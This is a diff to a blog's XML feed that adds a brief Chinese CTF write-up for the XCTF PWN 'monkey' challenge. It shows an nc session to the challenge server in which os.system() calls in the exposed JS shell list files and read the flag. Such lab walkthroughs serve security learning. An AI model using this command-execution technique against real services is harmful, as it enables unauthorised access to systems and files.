@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>XCTF-PWN-monkey</title>
+      <link href="/20220117-ctf-monkey/"/>
+      <url>/20220117-ctf-monkey/</url>
+      
+        <content type="html"><![CDATA[<h1 id="XCTF-PWN-monkey"><a href="#XCTF-PWN-monkey" class="headerlink" title="XCTF-PWN-monkey"></a>XCTF-PWN-monkey</h1><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202201171458395.png" alt="image-20220117145847037"></p><h2 id="知识笔记"><a href="#知识笔记" class="headerlink" title="知识笔记"></a>知识笔记</h2><ul><li>pwntools调用动态链接库：<code>p = process([process_name], env=&#123;&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;&#125;)</code></li><li>由于js解释器，可以使用函数<code>os.system()</code></li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@LAPTOP-V4AB5SPG:/mnt/c/Users/19269$ nc 111.200.241.244 58615</span><br><span class="line"><span class="meta">js&gt;</span><span class="bash"> os.system(ls)</span></span><br><span class="line">os.system(ls)</span><br><span class="line"><span class="meta">js&gt;</span><span class="bash"> os.system(<span class="string">&#x27;ls&#x27;</span>)</span></span><br><span class="line">os.system(&#x27;ls&#x27;)</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libnspr4.so</span><br><span class="line">libplc4.so</span><br><span class="line">libplds4.so</span><br><span class="line">run.sh</span><br><span class="line"><span class="meta">js&gt;</span><span class="bash"> os.system(<span class="string">&#x27;cat flag&#x27;</span>)</span></span><br><span class="line">os.system(&#x27;cat flag&#x27;)</span><br><span class="line">cyberpeace&#123;4c208231f622007ccd25e1cc6baaaa65&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>好想有人替我总结</title>
       <link href="/20211231/"/>
       <url>/20211231/</url>
